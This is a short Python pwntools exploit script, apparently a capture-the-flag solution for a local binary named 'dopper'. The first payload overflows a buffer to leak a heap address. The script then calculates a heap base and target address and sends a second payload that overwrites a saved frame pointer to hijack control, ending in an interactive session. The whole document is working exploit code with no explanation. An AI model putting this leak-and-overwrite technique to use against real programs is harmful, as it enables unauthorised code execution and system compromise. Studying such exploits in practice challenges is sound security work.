#!/usr/bin/env python3

from pwn import *

target = process("../bin/dopper")

payload = b"PRINT\x00" + b"a" * 18 + b"\x90"
print(len(payload))

target.send(payload)
target.recvline()
target.recvline()
target.recvline()
target.recvline()

leak = target.recvline().split()[-1] + b"\x00\x00"
leak = u64(leak)
print(hex(leak))

heap_base = leak - 0x2a0
pinebel_num_addr = heap_base + 0x640 + 0xc0
rbp = pinebel_num_addr + 0x4
payload = b"a" * 0x30 + p64(rbp)

#gdb.attach(target)
#pause()
target.send(payload)
target.interactive()

